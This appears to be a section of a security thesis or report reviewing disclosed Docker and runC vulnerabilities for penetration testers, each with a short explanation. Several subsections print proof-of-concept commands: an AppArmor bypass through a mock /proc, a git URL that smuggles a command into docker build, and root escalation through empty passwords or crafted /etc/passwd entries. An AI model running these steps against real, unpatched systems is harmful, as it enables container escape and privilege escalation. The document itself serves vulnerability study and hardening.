\section{Vulnerabilities}\label{section:vulnerabilities}
In this section we will look at vulnerabilities that have been found in the last years. Although there have been many vulnerabilities found in the Docker ecosystem, not all of them have a large impact. Others are not fully publicly disclosed. We will look some recent, fully disclosed vulnerabilities that might be of use during a penetration test. In the \hyperref[appendix:CVE-List]{appendix} you can find a list of all other Docker related vulnerabilities I have looked at.
Because there are many security researchers looking for vulnerabilities in containerization software, this section will likely become quickly outdated after publishing and as such should not be used as an inclusive list of important vulnerabilities.

\hfill

All of these vulnerabilities can be prevented by using the latest version of Docker and Docker images. This is covered by guidelines 1.1.2 (Ensure that the version of Docker is up to date) and 5.27 (Ensure that Docker commands always make use of the latest version of their image), respectively.

\subsection{CVE--2019--16884}
Because of a bug in runC (1.0.0-rc8 and older versions) it was possible to mount \lstinline{/proc} in a. Because the active AppArmor profile is defined in \lstinline{/proc/self/attr/apparmor/current}, this vulnerability allows a container to bypass AppArmor completely.

\hfill

A proof of concept has been provided at\cite{CVE-2019-16884-Github}. We see that if we create a very simple mock \lstinline{/proc}, the Docker starts without the specified AppArmor profile.
\begin{lstlisting}[caption={Bypass AppArmor by mounting \lstinline{/proc}},captionpos=b]
(host)$ mkdir -p rootfs/proc/self/{attr,fd}
(host)$ touch rootfs/proc/self/{status,attr/exec}
(host)$ touch rootfs/proc/self/fd/{4,5}
(host)$ cat Dockerfile
FROM busybox
ADD rootfs /

VOLUME /proc
(host)$ docker build -t apparmor-bypass .
(host)$ docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass
# container runs unconfined
\end{lstlisting}

\subsection{CVE--2019--13139}
Before Docker 18.09.4, \lstinline{docker build} incorrectly parsed \lstinline{git@} urls, which allows code execution\cite{CVE-2019-13139-STAALDRAAD}. The string supplied to \lstinline{docker build} is split on ``:'' and ``\#'' to parse out the \lstinline{git} \lstinline{ref} to use clone. By supplying a malicious url, it is possible to achieve code execution.

\hfill

For example, in the following \lstinline{docker build} command, the command \lstinline{echo attack} is executed.

\begin{lstlisting}
(host)$ docker build "git@github.com/meh/meh#--upload-pack=echo attack;#:"
\end{lstlisting}

\lstinline{docker build} executes \lstinline{git fetch} in the background. But with the malicious command \lstinline{git fetch --upload-pack=echo attack; git@github.com/meh/meh} is executed.

\subsection{CVE--2019--5736}
A very serious vulnerability was discovered in runC (which is used by Docker) that allows containers to overwrite the runC binary on the host\cite{CVE-2019-5736-DragonSector}\cite{CVE-2019-5736-Github}\cite{CVE-2019-5736-Twistlock}. Whenever a Docker is created or when \lstinline{docker exec} is used, a runC process is run. This runC process bootstraps the container. It creates all the necessary restrictions and then executes the process that needs to run in the container. The researches found that it is possible to make runC execute itself in the container, by telling the container to start \lstinline{/proc/self/exe} which during the bootstrap is symlinked to the runC binary. If this happens, \lstinline{/proc/self/exe} in the container will point to the runC binary on the host. The root user in the container is then able to replace the runC host binary using that reference. The next time runC is executed (a container is created or \lstinline{docker exec} is run), the overwritten binary is run instead.
This, of course, is very dangerous because it allows a malicious container to execute code on the host.

\subsection{CVE--2019--5021}\label{subsection:CVE-2019-5021}
One of the most used base images (the Docker image for Alpine Linux) had a problem where the password of the \lstinline{root} user is left empty. In Linux it is possible to disable a password (what should have happened) and to leave it blank. A disabled password cannot be used, but a blank password equals an empty input. This allows non-root users to gain root rights by supplying a blank password.

\hfill

It is still possible to use the vulnerable images.
\begin{lstlisting}
(host)$ docker run -it --rm alpine:3.5 cat /etc/shadow
root:::0:::::
(host)$ docker run -it --rm alpine:3.5 sh
(cont)# apk add --no-cache linux-pam shadow
...
(cont)# adduser test
...
(cont)# su test
Password:
(cont)$ su root
(cont)#
\end{lstlisting}

\subsubsection*{Side note about the CVSS score of CVE--2019--5021}

This vulnerability has a CVSS score of 9.8 (and a 10 in CVSS 2)\footnote{\url{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}}. The CVSS scores are out of 10, meaning this is seen as an extremely high-risk vulnerability. But in actuality, this vulnerability is only risky in very specific cases. ``Empty \lstinline{root} password'' sounds very dangerous, but it really is not that dangerous in an isolated container that runs root by default. Only in the very specific case that a process in a container runs as a non-root user and their is some vulnerability or misconfiguration that allows \lstinline{root} to escape the container and an attacker can get control of the process in the container is this dangerous. In other words, this vulnerability is actually not likely to be used in the wild and most likely needs to be combined with another vulnerability or misconfiguration to be able to do damage.

\subsection{CVE--2018--15664}
A bug was found in Docker 18.06.1-ce-rc1 that allows processes in containers to read and write files on the host\cite{CVE-2018-15664-Openwall}\cite{CVE-2018-15664-Bugzilla}. There is enough time between the checking if a symlink is linked to a safe path (within the container) and the actual using of the symlink, that the symlink can be pointed to another file in the mean time. This allows a container to start by reading or writing a symlink to a arbitrary non-relevant file in the container, but actually read or write a file on the host.

\subsection{CVE--2018--9862}
Docker did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2018-9862-Github}. This can be misused using the first entry of \lstinline{/etc/passwd}. This allows malicious images be created with users that grant \lstinline{root} rights when used.

\begin{lstlisting}
(host)$ docker run --rm -ti ... 797fd343ef02 bash
(cont)# echo "10:x:0:0:root:/root:/bin/bash">/etc/passwd
(host)$ docker exec -ti -u 10 hello  bash
(cont)# id
uid=0(10) gid=0(root) groups=0(root)
\end{lstlisting}

\subsection{CVE--2016--3697}

Docker before 1.11.2 did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2016-3697-Github}. This allows malicious images be created with users that grant \lstinline{root} rights when used.
\begin{lstlisting}[caption={Override \lstinline{root} user in container.},captionpos=b]
(host)$ docker run --rm -it --name=test ubuntu:latest /bin/bash
(cont)# echo '31337:x:0:0:root:/root:/bin/bash' >> /etc/passwd
(host)$ sudo docker exec -it --user 31337 test /bin/bash
(cont)# id
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

